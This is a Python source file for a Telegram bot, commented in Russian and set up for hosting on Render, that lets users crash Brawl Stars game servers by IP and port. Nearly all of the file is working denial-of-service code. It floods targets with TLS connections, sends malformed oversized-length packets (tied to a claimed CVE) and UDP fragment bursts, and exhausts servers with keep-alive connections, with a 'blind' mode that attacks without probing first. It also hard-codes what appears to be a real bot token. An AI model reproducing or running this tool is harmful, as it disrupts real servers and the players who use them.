#!/usr/bin/env python3
"""
BRAWL STARS / BSD BRAWL SERVER CRASHER — RENDER READY
Полностью асинхронный, обход PaaS-фильтрации, автоопределение портов.
"""
import asyncio
import aiohttp
import ssl
import socket
import struct
import random
import time
import re
import os
import logging
import threading
from flask import Flask, request
import telebot
from telebot import types

# ---------- КОНФИГУРАЦИЯ ----------
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
MAX_CONCURRENT_TASKS = 500
PROBE_TIMEOUT = 4

SUPERCELL_PORTS = [9339, 9443, 8443, 5000, 5001, 5005, 5010, 5100]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

active_attacks = {}

# ---------- МОДУЛЬ ГЛУБОКОЙ РАЗВЕДКИ ----------
class TargetProber:
    @staticmethod
    async def async_tcp_connect(ip, port, timeout=3):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    @staticmethod
    async def async_http_head(ip, port, use_ssl=False):
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{ip}:{port}/"
        connector = aiohttp.TCPConnector(force_close=True, ssl=False if not use_ssl else ssl.create_default_context())
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.head(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"}):
                    return True
        except:
            return False

    @staticmethod
    async def probe(ip, port):
        results = []
        tasks = [TargetProber.async_tcp_connect(ip, p) for p in [port] + SUPERCELL_PORTS[:3]]
        tcp_oks = await asyncio.gather(*tasks, return_exceptions=True)
        for idx, ok in enumerate(tcp_oks):
            if ok is True:
                p = port if idx == 0 else SUPERCELL_PORTS[idx-1]
                results.append(f"TCP/{p} open")

        for ssl_flag in [False, True]:
            if await TargetProber.async_http_head(ip, port, use_ssl=ssl_flag):
                results.append(f"HTTP{'S' if ssl_flag else ''} response")

        alt_ports = [p for p in SUPERCELL_PORTS if p != port]
        alt_tasks = [TargetProber.async_tcp_connect(ip, p) for p in alt_ports]
        alt_oks = await asyncio.gather(*alt_tasks, return_exceptions=True)
        for p, ok in zip(alt_ports, alt_oks):
            if ok is True:
                results.append(f"Alt port {p} open")

        return len(results) > 0, "; ".join(results) if results else "No response"

# ---------- УДАРНОЕ ЯДРО ----------
class AsyncAttackCore:
    def __init__(self, target_ip, target_port):
        self.ip = target_ip
        self.port = target_port
        self.stop_event = asyncio.Event()

    async def tls_session_id_bomb(self):
        while not self.stop_event.is_set():
            try:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.ip, self.port, ssl=ssl_context),
                    timeout=1.5
                )
                writer.write(os.urandom(random.randint(512, 4096)))
                await writer.drain()
                writer.close()
            except:
                await asyncio.sleep(0.001)

    async def message_parser_bomb(self):
        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.ip, self.port),
                    timeout=1.5
                )
                msg_id = struct.pack(">H", random.randint(1000, 20000))
                length_field = struct.pack(">I", 0xFFFFFF)[1:]
                version = struct.pack(">I", 1)
                body = os.urandom(4)
                packet = msg_id + length_field + version + body
                writer.write(packet)
                await writer.drain()
                writer.close()
                await asyncio.sleep(0.0001)
            except:
                await asyncio.sleep(0.0005)

    async def udp_reassembly_bomb(self):
        while not self.stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                for _ in range(10):
                    frag1 = os.urandom(1400)
                    frag2 = os.urandom(1400)
                    await asyncio.get_event_loop().sock_sendto(sock, frag1, (self.ip, self.port))
                    await asyncio.get_event_loop().sock_sendto(sock, frag2, (self.ip, self.port))
                sock.close()
                await asyncio.sleep(0.00001)
            except:
                await asyncio.sleep(0.0001)

    async def keepalive_flood(self):
        connections = []
        while not self.stop_event.is_set():
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.ip, self.port),
                    timeout=5
                )
                writer.write(b'\x00\x00\x00\x01\x01')
                connections.append(writer)
                if len(connections) > 300:
                    for old in connections[:50]:
                        try:
                            old.close()
                        except:
                            pass
                    connections = connections[50:]
                await asyncio.sleep(0.05)
            except:
                await asyncio.sleep(0.1)

    async def run(self):
        tasks = []
        for _ in range(100):
            tasks.append(asyncio.create_task(self.tls_session_id_bomb()))
        for _ in range(150):
            tasks.append(asyncio.create_task(self.message_parser_bomb()))
        for _ in range(100):
            tasks.append(asyncio.create_task(self.udp_reassembly_bomb()))
        for _ in range(150):
            tasks.append(asyncio.create_task(self.keepalive_flood()))
        await asyncio.gather(*tasks, return_exceptions=True)

# ---------- ОБЕРТКА ДЛЯ ЗАПУСКА В ОТДЕЛЬНОМ ПОТОКЕ ----------
class AttackWrapper:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.loop = None
        self.core = None
        self.thread = None

    def start(self):
        def run_loop():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.core = AsyncAttackCore(self.ip, self.port)
            self.loop.run_until_complete(self.core.run())
        self.thread = threading.Thread(target=run_loop, daemon=True)
        self.thread.start()

    def stop(self):
        if self.core:
            self.core.stop_event.set()
        if self.thread:
            self.thread.join(timeout=3)

# ---------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----------
def parse_target(text):
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if m:
        return m.group(1), int(m.group(2))
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if m:
        return m.group(1), 9339
    return None, None

def run_async_probe_and_launch(cid, ip, port, is_blind=False):
    async def _probe_and_launch():
        if is_blind:
            bot.send_message(cid, f"🔍 Слепая проверка {ip}:{port}...")
        alive, msg = await TargetProber.probe(ip, port)
        if not alive:
            if not is_blind:
                bot.send_message(cid, f"❌ Цель недоступна: {msg}\nИспользуйте !blind {ip}:{port} для атаки без проверки")
                return
            else:
                bot.send_message(cid, f"⚠️ Цель не отвечает: {msg}\nЗапуск слепой атаки...")
        else:
            bot.send_message(cid, f"✅ Цель подтверждена: {msg}\nЗапуск атаки...")
        
        wrapper = AttackWrapper(ip, port)
        wrapper.start()
        active_attacks[cid] = wrapper
        bot.send_message(cid, 
            f"💀 АТАКА ЗАПУЩЕНА\n"
            f"🎯 {ip}:{port}\n"
            f"📊 Векторы:\n"
            f"  • TLS Session ID Bomb: 100 задач\n"
            f"  • Message Parser Bomb (CVE-2025-1173): 150 задач\n"
            f"  • UDP Reassembly Bomb: 100 задач\n"
            f"  • Keep-Alive Flood: 150 задач\n"
            f"🔴 Всего: 500 асинхронных задач\n\n"
            f"stop - остановка"
        )
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(_probe_and_launch())

# ---------- ОБРАБОТЧИКИ TELEGRAM ----------
@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(m):
    cid = m.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(m, "🛑 Атака остановлена")
        del active_attacks[cid]
    else:
        bot.reply_to(m, "💤 Нет активной атаки")

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('!blind'))
def blind_cmd(m):
    cid = m.chat.id
    parts = m.text.split()
    if len(parts) < 2:
        bot.reply_to(m, "❌ Использование: !blind IP:PORT\nПример: !blind 34.240.15.100:9339")
        return
    
    ip, port = parse_target(parts[1])
    if not ip:
        bot.reply_to(m, "❌ Неверный формат IP адреса")
        return
    
    if cid in active_attacks:
        bot.reply_to(m, "⚠️ Атака уже активна! stop для остановки")
        return
    
    if not port:
        port = 9339
    
    threading.Thread(target=run_async_probe_and_launch, args=(cid, ip, port, True), daemon=True).start()

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(m):
    cid = m.chat.id
    ip, port = parse_target(m.text)
    
    if not ip:
        bot.reply_to(m, "❌ Неверный формат IP адреса")
        return
    
    if cid in active_attacks:
        bot.reply_to(m, "⚠️ Атака уже активна! Используйте stop для остановки")
        return
    
    if not port:
        port = 9339
    
    bot.send_message(cid, f"🔍 Проверка цели {ip}:{port}...")
    threading.Thread(target=run_async_probe_and_launch, args=(cid, ip, port, False), daemon=True).start()

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, 
        "🎮 BRAWL STARS / BSD BRAWL SERVER CRASHER\n\n"
        "Команды:\n"
        "• IP:PORT → проверка + атака (порт по умолчанию: 9339)\n"
        "• !blind IP:PORT → атака без проверки\n"
        "• stop → остановка всех атак\n\n"
        "Примеры:\n"
        "• 34.240.15.100\n"
        "• 34.240.15.100:9443\n"
        "• !blind 34.240.15.100:9339"
    )

# ---------- WEBHOOK ----------
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
def webhook():
    if request.method == 'GET':
        return 'OK', 200
    try:
        update = types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'ok', 200
    except Exception as e:
        logging.error(f"Webhook error: {e}")
        return 'error', 500

@app.route('/')
def index():
    return 'BS CRASHER RUNNING'

# ---------- ЗАПУСК ----------
if __name__ == "__main__":
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-service.onrender.com")
    bot.remove_webhook()
    time.sleep(0.5)
    bot.set_webhook(url=f"{RENDER_URL}/webhook/{BOT_TOKEN}")
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False) 
